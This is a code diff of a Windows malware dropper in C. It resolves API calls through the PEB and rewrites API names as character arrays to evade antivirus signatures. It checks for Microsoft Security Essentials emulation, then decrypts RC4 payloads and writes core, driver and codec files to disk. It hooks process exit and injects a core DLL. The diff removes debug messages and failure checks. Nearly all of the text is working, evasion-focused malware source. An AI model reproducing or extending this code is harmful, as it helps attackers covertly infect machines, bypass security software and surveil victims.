@@ -77,28 +77,27 @@ XREFNAMES data_imports[] = {
 			"GetVersionExA",		// 29
 			"GetModuleHandleA",		// 30
 			"GetModuleFileNameA",	// 31
-			"GetFileAttributesA",	// 32
 			NULL
 	}
 	}, // KERNEL32.DLL
 	{ "NTDLL.DLL",
 	{
-		"RtlExitUserProcess",		// 33
+		"RtlExitUserProcess",		// 32
 		NULL
 	}
 	}, // NTDLL.DLL
 	{ "MSVCRT.DLL",
 	{
-		"sprintf",				// 34
-		"exit",					// 35
-		"_exit",				// 36
+		"sprintf",				// 33
+		"exit",					// 34
+		"_exit",				// 35
 		NULL
 	} 
 	}, // USER32.DLL
 	
 	{ "ADVAPI32.DLL",
 	{
-		"GetCurrentHwProfileA", // 37
+		"GetCurrentHwProfileA", // 36
 	}
 	}, // ADVAPI32.DLL
 
@@ -203,165 +202,57 @@ int __stdcall DropperEntryPoint( DropperHeader* header )
 	//
 	// *** Get address of needed calls through PEB
 	//
-	LOADLIBRARY    pfn_LoadLibrary	   = 0;
-	GETPROCADDRESS pfn_GetProcAddress  = 0;
-	
-	PEB_LIST_ENTRY* head;
-	DWORD **pPEB;
-	DWORD *Ldr;
-	
-	__asm {
-		mov eax,30h
-		mov eax,DWORD PTR fs:[eax]
-		add eax, 08h
-		mov ss:[pPEB], eax
-	}
-	
-	Ldr = *(pPEB + 1);
-	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
-	
-	PEB_LIST_ENTRY* entry = head;
-	do {		
-		DWORD imageBase = entry->ImageBase;
-		if (imageBase == NULL)
-			goto NEXT_ENTRY;
-		
-		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
-		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
-		
-		// *** check if we have an export table
-		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
-			goto NEXT_ENTRY;
-		
-		// *** get EXPORT table
-		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
-			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-		
-		// *** check for valid module name
-		char* moduleName = (char*)(imageBase + exportDirectory->Name);
-		if (moduleName == NULL)
-			goto NEXT_ENTRY;
-		
-		if ( ! _STRCMPI_(moduleName+1, STRING(STRIDX_KERNEL32_DLL)+1) ) // +1 to bypass f-secure signature
-		{
-			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
-			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
-			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
-			
-			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
-			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
-			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
-			
-			// *** get pointers to LoadLibraryA and GetProcAddress entry points
-			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
-			{
-				if (Functions[x] == 0)
-					continue;
-				
-				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
-				{
-					if (NameOrds[y] == x)
-					{
-						char *name = (char *) (imageBase + Names[y]);
-						if (name == NULL)
-							continue;
-						
-						if (!_STRCMPI_(STRING(STRIDX_LOADLIBRARYA), name)) {
-							pfn_LoadLibrary = (LOADLIBRARY) (imageBase + Functions[x]);
-						} else if (!_STRCMPI_(STRING(STRIDX_GETPROCADDRESS), name)) {
-							pfn_GetProcAddress = (GETPROCADDRESS) (imageBase + Functions[x]);
-						}
-						break;
-					}
-				}
-			}
-		}
-NEXT_ENTRY:
-		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
-	
-	} while (entry != head);
 
-	//
-	// *** Fix call addresses
-	//
-	
-	DWORD callIndex = 0;
-	char * ptr = dlls;
-	while (ptr < (dlls + header->dlls.size)) {
-		// get number of calls
-		DWORD nCalls = *((DWORD*)ptr);
-		ptr += sizeof(DWORD);
-		// get name of dll
-		char * dllName = ptr;
-		
-		// load dll
-		HMODULE hMod = pfn_LoadLibrary(dllName);
-				
-		ptr += _STRLEN_(dllName) + 1;
-		for (DWORD i = 0; i < nCalls; i++) {		
-			
-			// store address of call
-			dll_calls[callIndex] = (DWORD) pfn_GetProcAddress(hMod, ptr);
-			
-			callIndex++;
-			ptr += _STRLEN_(ptr) + 1;
-		}
-	}
-	
-	//
-	// *** map call addresses to function pointers
-	//
-	
-#ifdef _DEBUG
-	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
-#endif	
-	
-	CREATEFILE pfn_CreateFile = (CREATEFILE) dll_calls[CALL_CREATEFILEA];
-	CREATEDIRECTORY pfn_CreateDirectory = (CREATEDIRECTORY) dll_calls[CALL_CREATEDIRECTORYA];
-	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE) dll_calls[CALL_CLOSEHANDLE];
-	WRITEFILE pfn_WriteFile = (WRITEFILE) dll_calls[CALL_WRITEFILE];
-	READFILE pfn_ReadFile = (READFILE) dll_calls[CALL_READFILE];
-	SETFILEPOINTER pfn_SetFilePointer = (SETFILEPOINTER) dll_calls[CALL_SETFILEPOINTER];
-	GETMODULEFILENAME pfn_GetModuleFileName = (GETMODULEFILENAME) dll_calls[CALL_GETMODULEFILENAMEW];
-	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
-	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
-	VIRTUALPROTECT pfn_VirtualProtect = (VIRTUALPROTECT) dll_calls[CALL_VIRTUALPROTECT];
-	WINEXEC pfn_WinExec = (WINEXEC) dll_calls[CALL_WINEXEC];
-	FREELIBRARY pfn_FreeLibrary = (FREELIBRARY) dll_calls[CALL_FREELIBRARY];
-	GETENVIRONMENTVARIABLE pfn_GetEnvironmentVariable = (GETENVIRONMENTVARIABLE) dll_calls[CALL_GETENVIRONMENTVARIABLEA];
-	SETCURRENTDIRECTORY pfn_SetCurrentDirectory = (SETCURRENTDIRECTORY) dll_calls[CALL_SETCURRENTDIRECTORYA];
-	SETFILEATTRIBUTES pfn_SetFileAttributes = (SETFILEATTRIBUTES) dll_calls[CALL_SETFILEATTRIBUTESA];
-	DEBUGACTIVEPROCESS pfn_DebugActiveProcess = (DEBUGACTIVEPROCESS) dll_calls[CALL_DEBUGACTIVEPROCESS];
-	GETCURRENTPROCESSID pfn_GetCurrentProcessID = (GETCURRENTPROCESSID) dll_calls[CALL_GETCURRENTPROCESSID];
-	CREATETHREAD pfn_CreateThread = (CREATETHREAD) dll_calls[CALL_CREATETHREAD];
-	GETTHREADCONTEXT pfn_GetThreadContext = (GETTHREADCONTEXT) dll_calls[CALL_GETTHREADCONTEXT];
-	SETTHREADCONTEXT pfn_SetThreadContext = (SETTHREADCONTEXT) dll_calls[CALL_SETTHREADCONTEXT];
-	GETFILESIZE pfn_GetFileSize = (GETFILESIZE) dll_calls[CALL_GETFILESIZE];
-	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
-	GETLASTERROR pfn_GetLastError = (GETLASTERROR) dll_calls[CALL_GETLASTERROR];
-	SPRINTF pfn_sprintf = (SPRINTF) dll_calls[CALL_SPRINTF];
-	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY) dll_calls[CALL_VIRTUALQUERY];
-	VERIFYVERSIONINFO pfn_VerifyVersionInfo = (VERIFYVERSIONINFO) dll_calls[CALL_VERIFYVERSIONINFO];
-	GETVERSIONEX pfn_GetVersionEx = (GETVERSIONEX) dll_calls[CALL_GETVERSIONEX];
-	GETCURRENTHWPROFILE pfn_GetCurrentHwProfile = (GETCURRENTHWPROFILE) dll_calls[CALL_GETCURRENTHWPROFILE];
-	GETMODULEHANDLE pfn_GetModuleHandle = (GETMODULEHANDLE) dll_calls[CALL_GETMODULEHANDLE];
-	GETMODULEFILENAME pfn_GetModuleFileNameA = (GETMODULEFILENAME) dll_calls[CALL_GETMODULEFILENAMEA];
-	GETFILEATTRIBUTESA pfn_GetFileAttributesA = (GETFILEATTRIBUTESA) dll_calls[CALL_GETFILEATTRIBUTESA];
-	DWORD imageBase = 0;
-	__asm {
-		push eax
-		push ebx
-		mov eax, fs:[30h]
-		mov ebx, [eax+8]
-		mov imageBase, ebx
-		pop ebx
-		pop eax
-	}		
-	
-	// loop IAT lookin for ExitProcess
-	IMAGE_DOS_HEADER * dosHeader = (IMAGE_DOS_HEADER *) imageBase;
-	IMAGE_NT_HEADERS * ntHeaders = (IMAGE_NT_HEADERS *) (((PBYTE)dosHeader) + dosHeader->e_lfanew);
-	
+	LOADLIBRARY pfn_LoadLibrary = resolveLoadLibrary();
+	GETPROCADDRESS pfn_GetProcAddress = resolveGetProcAddress();
+
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strCreateFile[] = { 'C',  'r',  'e',  'a',  't',  'e',  'F',  'i',  'l',  'e',  'A', 0x0 };
+	char strCreateDirectory[] = { 'C', 'r', 'e', 'a', 't', 'e', 'D', 'i', 'r', 'e', 'c', 't', 'o', 'r', 'y', 'A', 0x0 };
+	char strCloseHandle[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x0 };
+	char strWriteFile[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0x0 };
+	char strReadFile[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0x0 };
+	char strGetModuleFileName[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'A', 0x0 };
+	char strVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
+	char strVirtualFree[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
+	char strVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
+	char strGetEnvironmentVariable[] = { 'G', 'e', 't', 'E', 'n', 'v', 'i', 'r', 'o', 'n', 'm', 'e', 'n', 't', 'V', 'a', 'r', 'i', 'a', 'b', 'l', 'e', 'A', 0x0 };
+	char strSetCurrentDirectory[] = { 'S', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'D', 'i', 'r', 'e', 'c', 't', 'o', 'r', 'y', 'A', 0x0 };
+	char strSetFileAttributes[] = { 'S', 'e', 't', 'F', 'i', 'l', 'e', 'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 's', 'A', 0x0 };
+	char strGetCurrentProcessId[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', 0x0 };
+	char strCreateThread[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x0 };
+	char strSleep[] = { 'S', 'l', 'e', 'e', 'p', 0x0 };
+	char strGetLastError[] = { 'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0x0 };
+	char strVirtualQuery[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', 0x0 };
+	char strGetVersionEx[] = { 'G', 'e', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'E', 'x', 'A', 0x0 };
+	char strGetModuleHandle[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0 };
+	char strGetFileAttributes[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 's', 'A', 0x0 };
+
+	HMODULE hMod = pfn_LoadLibrary(strKernel32);
+
+	CREATEFILE pfn_CreateFile = (CREATEFILE) pfn_GetProcAddress(hMod, strCreateFile);
+	CREATEDIRECTORY pfn_CreateDirectory = (CREATEDIRECTORY) pfn_GetProcAddress(hMod, strCreateDirectory);
+	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE) pfn_GetProcAddress(hMod, strCloseHandle);
+	WRITEFILE pfn_WriteFile = (WRITEFILE) pfn_GetProcAddress(hMod, strWriteFile);
+	READFILE pfn_ReadFile = (READFILE) pfn_GetProcAddress(hMod, strReadFile);
+	GETMODULEFILENAME pfn_GetModuleFileName = (GETMODULEFILENAME) pfn_GetProcAddress(hMod, strGetModuleFileName);
+	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) pfn_GetProcAddress(hMod, strVirtualAlloc);
+	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) pfn_GetProcAddress(hMod, strVirtualFree);
+	VIRTUALPROTECT pfn_VirtualProtect = (VIRTUALPROTECT) pfn_GetProcAddress(hMod, strVirtualProtect);
+	GETENVIRONMENTVARIABLE pfn_GetEnvironmentVariable = (GETENVIRONMENTVARIABLE) pfn_GetProcAddress(hMod, strGetEnvironmentVariable);
+	SETCURRENTDIRECTORY pfn_SetCurrentDirectory = (SETCURRENTDIRECTORY) pfn_GetProcAddress(hMod, strSetCurrentDirectory);
+	SETFILEATTRIBUTES pfn_SetFileAttributes = (SETFILEATTRIBUTES) pfn_GetProcAddress(hMod, strSetFileAttributes);
+	GETCURRENTPROCESSID pfn_GetCurrentProcessId = (GETCURRENTPROCESSID) pfn_GetProcAddress(hMod, strGetCurrentProcessId);
+	CREATETHREAD pfn_CreateThread = (CREATETHREAD) pfn_GetProcAddress(hMod, strCreateThread);
+	SLEEP pfn_Sleep = (SLEEP) pfn_GetProcAddress(hMod, strSleep);
+	GETLASTERROR pfn_GetLastError = (GETLASTERROR) pfn_GetProcAddress(hMod, strGetLastError);
+	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY) pfn_GetProcAddress(hMod, strVirtualQuery);
+	GETVERSIONEX pfn_GetVersionEx = (GETVERSIONEX) pfn_GetProcAddress(hMod, strGetVersionEx);
+	GETMODULEHANDLE pfn_GetModuleHandle = (GETMODULEHANDLE) pfn_GetProcAddress(hMod, strGetModuleHandle);
+	GETMODULEFILENAME pfn_GetModuleFileNameA = (GETMODULEFILENAME) pfn_GetProcAddress(hMod, strGetModuleHandle);
+	GETFILEATTRIBUTESA pfn_GetFileAttributesA = (GETFILEATTRIBUTESA) pfn_GetProcAddress(hMod, strGetFileAttributes);
+
+
 	//
 	// GOTO OEP_CALL FROM NOW ON ONLY!!!
 	//
@@ -379,7 +270,6 @@ NEXT_ENTRY:
 	
 
 	/* Check for Microsoft Security Essential emulation */
-
 	char *fName = (char *)pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
 	pfn_GetModuleFileNameA(NULL, fName, MAX_PATH);
 	DWORD prgLen = _STRLEN_(fName);
@@ -411,9 +301,6 @@ NEXT_ENTRY:
 	BOOL bVersion = pfn_GetVersionEx(osVersion);
 	if ( FALSE == bVersion)
 		goto OEP_CALL;
-	
-	MESSAGE1(STRIDX_SYSMAJORVER, osVersion->dwMajorVersion);
-	MESSAGE1(STRIDX_SYSMINORVER, osVersion->dwMinorVersion);
 	
 	// Verify we are not running on Windows 7 or later
 	//if (osVersion->dwMajorVersion >= 6 && osVersion->dwMinorVersion >= 2)
@@ -470,13 +357,8 @@ NEXT_ENTRY:
 	_STRCAT_(lpTmpDir, STRING(STRIDX_INSTALL_DIR)); // lpInstDir);
 	_STRCAT_(lpTmpDir, STRING(STRIDX_DIRSEP));
 	
-	MESSAGE(lpTmpDir);
-	
 	BOOL bRet = pfn_CreateDirectory(lpTmpDir, NULL);
 	if (bRet == FALSE) {
-		
-		MESSAGE(STRING(STRIDX_ERRORCREDIR));
-		
 		DWORD dwLastError = pfn_GetLastError();
 		switch (dwLastError) {
 			case ERROR_ALREADY_EXISTS:
@@ -497,7 +379,6 @@ NEXT_ENTRY:
 	// add core.dll to path, will be used to call HFF8 later
 	_STRCAT_(lpTmpDir, (char *) (((char*)header) + header->files.names.core.offset));
 	header->dllPath = lpTmpDir;
-	MESSAGE(header->dllPath);
 	
 	//
 	// write the files
@@ -516,8 +397,8 @@ NEXT_ENTRY:
 	
 	// CORE64
 	ret = dump_to_file(header->files.names.core64, header->files.core64, header, pfn_DumpFile);
-	if (FALSE == ret)	
-		goto OEP_CALL;
+	//if (FALSE == ret)	
+	//	goto OEP_CALL;
 	
 	// CONFIG
 	ret = dump_to_file(header->files.names.config, header->files.config, header, pfn_DumpFile);
@@ -526,18 +407,18 @@ NEXT_ENTRY:
 	
 	// DRIVER
 	ret = dump_to_file(header->files.names.driver, header->files.driver, header, pfn_DumpFile);
-	if (FALSE == ret)	
-		goto OEP_CALL;
+	//if (FALSE == ret)	
+	//	goto OEP_CALL;
 	
 	// DRIVER64
 	ret = dump_to_file(header->files.names.driver64, header->files.driver64, header, pfn_DumpFile);
-	if (FALSE == ret)	
-		goto OEP_CALL;
+	//if (FALSE == ret)	
+	//	goto OEP_CALL;
 	
 	// CODEC
 	ret = dump_to_file(header->files.names.codec, header->files.codec, header, pfn_DumpFile);
-	if (FALSE == ret)	
-		goto OEP_CALL;
+	//if (FALSE == ret)	
+	//	goto OEP_CALL;
 	
 	//
 	// Install syscall hooks
@@ -567,6 +448,10 @@ NEXT_ENTRY:
 		}
 	}
 
+	// loop IAT lookin for ExitProcess
+	DWORD imageBase = (DWORD)pfn_GetModuleHandle(strKernel32);
+	IMAGE_DOS_HEADER * dosHeader = (IMAGE_DOS_HEADER *) imageBase;
+	IMAGE_NT_HEADERS * ntHeaders = (IMAGE_NT_HEADERS *) (((PBYTE)dosHeader) + dosHeader->e_lfanew);
 	UINT_PTR IAT_rva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
 	if (pfn_HookCall && IAT_rva)
 	{
@@ -595,7 +480,6 @@ NEXT_ENTRY:
 	//
 	// Spawn thread to run core dll
 	//
-	
 	THREADPROC pfn_CoreThreadProc = (THREADPROC)(((char*)header) + header->functions.coreThread.offset); 
 	if (pfn_CoreThreadProc)
 	{
@@ -616,7 +500,6 @@ OEP_CALL:
 	// *** Restore stage1 original code
 	//
 	
-	MESSAGE(STRING(STRIDX_RESTORESTAGE1));
 	if (header->stage1.size) {
 		DWORD oldProtect = 0;
 		char *code = (char*) ( ((char*)header) + header->stage1.offset );
@@ -656,31 +539,41 @@ BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DWORD orig
 	char * strings = (char *) (((char*)header) + header->strings.offset);
 	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
 	
-	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
-	SETFILEATTRIBUTES pfn_SetFileAttributes = (SETFILEATTRIBUTES) dll_calls[CALL_SETFILEATTRIBUTESA];
-	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
-	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
-	CREATEFILE pfn_CreateFile = (CREATEFILE) dll_calls[CALL_CREATEFILEA];
-	WRITEFILE pfn_WriteFile = (WRITEFILE) dll_calls[CALL_WRITEFILE];
-	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE) dll_calls[CALL_CLOSEHANDLE];
 	
+	LOADLIBRARY    pfn_LoadLibrary = resolveLoadLibrary();
+	GETPROCADDRESS pfn_GetProcAddress  = resolveGetProcAddress();
+
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strSetFileAttributes[] = { 'S', 'e', 't', 'F', 'i', 'l', 'e', 'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 's', 'A', 0x0 };
+	char strVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
+	char strVirtualFree[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
+	char strCreateFile[] = { 'C',  'r',  'e',  'a',  't',  'e',  'F',  'i',  'l',  'e',  'A', 0x0 };
+	char strWriteFile[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0x0 };
+	char strCloseHandle[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x0 };
+
+	HMODULE hMod = pfn_LoadLibrary(strKernel32);
+	SETFILEATTRIBUTES pfn_SetFileAttributes = (SETFILEATTRIBUTES) pfn_GetProcAddress(hMod, strSetFileAttributes);
+	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) pfn_GetProcAddress(hMod, strVirtualAlloc);
+	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) pfn_GetProcAddress(hMod, strVirtualFree);
+	CREATEFILE pfn_CreateFile = (CREATEFILE) pfn_GetProcAddress(hMod, strCreateFile);
+	WRITEFILE pfn_WriteFile = (WRITEFILE) pfn_GetProcAddress(hMod, strWriteFile);
+	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE) pfn_GetProcAddress(hMod, strCloseHandle);
+		
 	// decrypt data
 	RC4_SKIP pfn_rc4skip = (RC4_SKIP) (((char*)header) + header->functions.rc4.offset);
 #define RC4_DECRYPT(buf, buf_len, key, key_len, header) pfn_rc4skip((unsigned char*)key, key_len, 0, (unsigned char*)buf, buf_len, header)
+
 	RC4_DECRYPT(fileData, fileSize, header->rc4key, RC4KEYLEN, header);
+
 	
 	// decompress data
 	char* uncompressed = (char*) pfn_VirtualAlloc(NULL, originalSize, MEM_COMMIT, PAGE_READWRITE);
 	
 	int uncompressed_size = aP_depack(fileData, uncompressed);
 	if (uncompressed_size != originalSize) {
-		MESSAGE(STRING(STRIDX_UNCOMPRESS_ERR));
 		return FALSE;
 	}
 	
-	// create or open the file for overwriting
-	MESSAGE(fileName);
-
 	// restore normal attributes if the file already exists
 	pfn_SetFileAttributes(fileName, FILE_ATTRIBUTE_NORMAL);
 	
@@ -692,7 +585,6 @@ BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DWORD orig
 		FILE_ATTRIBUTE_NORMAL, 
 		NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
-		MESSAGE(STRING(STRIDX_CREATEFILE_ERR));
 		return FALSE;
 	}
 	
@@ -722,22 +614,25 @@ DWORD WINAPI CoreThreadProc(__in  LPVOID lpParameter)
 	char * dlls = (char *) (((char*)header) + header->dlls.offset);
 	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
 	
-	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
-	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
-	WINEXEC pfn_WinExec = (WINEXEC) dll_calls[CALL_WINEXEC];
-	FREELIBRARY pfn_FreeLibrary = (FREELIBRARY) dll_calls[CALL_FREELIBRARY];
-	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
-	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
-	GETPROCADDRESS pfn_GetProcAddress = (GETPROCADDRESS) dll_calls[CALL_GETPROCADDRESS];
-	LOADLIBRARY pfn_LoadLibrary = (LOADLIBRARY) dll_calls[CALL_LOADLIBRARY];
+	LOADLIBRARY    pfn_LoadLibrary	   = resolveLoadLibrary();
+	GETPROCADDRESS pfn_GetProcAddress  = resolveGetProcAddress();
+
+
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strSleep[] = { 'S', 'l', 'e', 'e', 'p', 0x0 };
+	char strVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
+	char strVirtualFree[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
+
+	HMODULE hMod = pfn_LoadLibrary(strKernel32);
+	SLEEP pfn_Sleep = (SLEEP) pfn_GetProcAddress(hMod, strSleep);
+	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) pfn_GetProcAddress(hMod, strVirtualAlloc);
+	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) pfn_GetProcAddress(hMod, strVirtualFree);
 	
 	char* complete_path = (char*) pfn_VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
 	
 	_MEMCPY_( complete_path, STRING(STRIDX_RUNDLL), STRLEN(STRIDX_RUNDLL) );
 	_STRCAT_( complete_path, header->dllPath);
 	_STRCAT_( complete_path, STRING(STRIDX_COMMAHFF8));
-	
-	MESSAGE(complete_path);
 		
 	HMODULE hLib = pfn_LoadLibrary(header->dllPath);
 	if (hLib == INVALID_HANDLE_VALUE)
@@ -756,9 +651,7 @@ DWORD WINAPI CoreThreadProc(__in  LPVOID lpParameter)
 	// ** INJECT CORE !!!
 	// *
 	
-	MESSAGE(STRING(STRIDX_HFF5CALLING));
 	pfn_HFF5(complete_path, NULL, startupinfo, procinfo);
-	MESSAGE(STRING(STRIDX_HFF5CALLED));
 
 THREAD_EXIT:
 	
@@ -802,18 +695,25 @@ lbl_ref1:
 	char * dlls = (char *) (((char*)header) + header->dlls.offset);
 	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
 	
-	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
-	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
+	LOADLIBRARY    pfn_LoadLibrary	   = resolveLoadLibrary();
+	GETPROCADDRESS pfn_GetProcAddress  = resolveGetProcAddress();
+
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strSleep[] = { 'S', 'l', 'e', 'e', 'p', 0x0 };
+	char strExitProcess[] = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
 	
-	MESSAGE(STRING(STRIDX_INEXITPROC_HOOK));
+	HMODULE hMod = pfn_LoadLibrary(strKernel32);
+	SLEEP pfn_Sleep = (SLEEP) pfn_GetProcAddress(hMod, strSleep);
+	EXITPROCESS pfn_OriginalExitProcess = (EXITPROCESS) pfn_GetProcAddress(hMod, strExitProcess);
 	
+	//ntdll 
+	char strNTDll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
+	char strRtlExitUserProcess[] = { 'R', 't', 'l', 'E', 'x', 'i', 't', 'U', 's', 'e', 'r', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
+	hMod = pfn_LoadLibrary(strNTDll);
+	EXITPROCESS pfn_OriginalRtlExitUserProcess = (EXITPROCESS) pfn_GetProcAddress(hMod, strRtlExitUserProcess);
+
 	while (header->synchro != 1)
 		pfn_Sleep(100);
-	
-	MESSAGE(STRING(STRIDX_VECTORQUIT));
-
-	EXITPROCESS pfn_OriginalRtlExitUserProcess = (EXITPROCESS) dll_calls[CALL_RTLEXITUSERPROCESS];
-	EXITPROCESS pfn_OriginalExitProcess = (EXITPROCESS) dll_calls[CALL_EXITPROCESS];
 
 	if (pfn_OriginalRtlExitUserProcess)
 		pfn_OriginalRtlExitUserProcess(uExitCode);
@@ -851,18 +751,25 @@ lbl_ref1:
 	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
 	
 #ifdef _DEBUG
-	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
+	//OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
 #endif
 	
-	EXIT pfn_OriginalExit = (EXIT) dll_calls[CALL_EXIT];
-	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
+	LOADLIBRARY pfn_LoadLibrary = resolveLoadLibrary();
+	GETPROCADDRESS pfn_GetProcAddress = resolveGetProcAddress();
+
+	char strMSVCrt[] = { 'M', 'S', 'V', 'C', 'R', 'T', '.', 'D', 'L', 'L', 0x0 };
+	char strExit[] = { 'e', 'x', 'i', 't', 0x0 };
+	HMODULE hMod = pfn_LoadLibrary(strMSVCrt);
+	EXIT pfn_OriginalExit = (EXIT) pfn_GetProcAddress(hMod, strExit);
+
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strSleep[] = { 'S', 'l', 'e', 'e', 'p', 0x0 };
+	hMod = pfn_LoadLibrary(strKernel32);
+	SLEEP pfn_Sleep = (SLEEP) pfn_GetProcAddress(hMod, strSleep);
 	
-	MESSAGE(STRING(STRIDX_INEXITPROC_HOOK));
 	
